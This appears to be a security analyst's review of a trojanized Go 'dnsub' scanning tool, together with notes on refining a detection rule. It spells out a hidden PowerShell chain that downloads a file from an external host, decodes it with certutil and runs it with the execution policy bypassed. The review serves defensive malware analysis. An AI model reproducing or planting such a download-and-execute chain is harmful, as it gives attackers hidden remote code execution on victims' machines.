# dnsub archive second review

Verdict: **MALICIOUS**. The supplied Go source archive identifies itself as
`github.com/Kaleidora/dnsub-scanning-tool@v0.0.0-20260915234017-06de181f2626`.
SHA-256: `9686f8c67b1a2d489f2dde25e744259337751ca59f2826d448bf8f22c6001b07`.

## Source evidence

`main.go:8` places 1,832 spaces between `exec.Command` and its argument list.
The returned command's `.Run()` method is invoked before argument parsing,
without a user-selected download or installation operation. Its arguments are:

1. `powershell -WindowStyle Hidden -Command`.
2. `Invoke-WebRequest` downloads
   `https://muckcoding.com/LG-LW/Api-Certificate` into
   `C:\Users\Public\Pictures\api.db`.
3. `certutil -decode` reads that same file and writes
   `C:\Users\Public\Pictures\L.ps1`.
4. `Start-Process` launches PowerShell with `-ExecutionPolicy Bypass -File`
   pointing to that decoded script, with `-WindowStyle Hidden -Wait`.

Go escape decoding yields ordinary Windows paths and PowerShell command text;
there is no additional embedded encoded stage in the supplied launcher. The
remote payload is not included, so its eventual effects are unknown. Source
concealment and unsolicited hidden activation of remote code are concrete
hostile behavior independent of the external host's reputation or any scanner
score. DNS reconnaissance alone would not justify this verdict.

The archive is incomplete: `main.go` imports only `os/exec` but still refers
to `signal`, `os`, `fmt`, `flag`, `common`, and undefined globals/functions.
A build-only check with `GOPROXY=off GOSUMDB=off go build -o <scratch-output>
<main.go>` fails with undefined-symbol errors. The source describes a malicious
launcher, but this archive cannot execute successfully as supplied. No sample
code or downloaded stage was executed.

## Other members

| Member | Assessment |
| --- | --- |
| `.github/workflows/main.yml` | Commits a timestamp to `LOG`, then force pushes using the Actions-provided repository token; minute schedule and mutable action references are metadata, without evidence of token theft. |
| `common/common.go` | PRNG text generation, file checks, and append-style CSV output; `0666` is a file-creation mode, not a chmod operation. |
| `common/queue.go` | Mutex-protected in-memory FIFO queue. |
| `core/dnstool.go` | DNS A/CNAME queries, retries, and random-name wildcard-response filtering; no DNS exfiltration or tasking. |
| `core/httpclient.go` | HTTP GET requests with browser User-Agent, disabled TLS verification, and extraction of title/Server/X-Powered-By banners; no upload, shell execution, or credential collection. |
| README, FUNDING, license, LOG, Finder metadata, PNGs | Documentation and packaging assets; PNG chunk walks end at IEND without appended data. No code path reads them as an executable payload. |

`atomscan` and `cleave facts` were run on the archive and each specifically
listed source/workflow member. Facts, decoded Go literals, call provenance,
and the complete source were inspected. Both hostile traits remain justified:
concealed payload activation and concealed execution-policy bypass. Ordinary
networking, decoding, execution and TLS configuration remain notable.

## Trait correction and controls

Previously, both hostile composites accepted any padded call anywhere in the
file alongside a visible PowerShell launch. The new AST matcher requires the
padding on the `exec.Command("powershell", ...)` call whose returned command
is immediately launched with Run, Start, Output, or CombinedOutput. Both
hostile composites now require this narrower evidence. The generic padding
trait remains available for other calls and yields to the specific observation
when present. No filename, endpoint, or staged basename gates detection.

Run the 12 static positive/negative controls with:

```sh
python3 testdata/triage/dnsub-second-review/check.py --work-dir /path/to/scratch
```

Controls cover the four launching methods, visible code, unrelated padded
calls, constructor-only code, an unrelated launched command, a program name
appearing only as an argument, comments, and below-threshold padding.
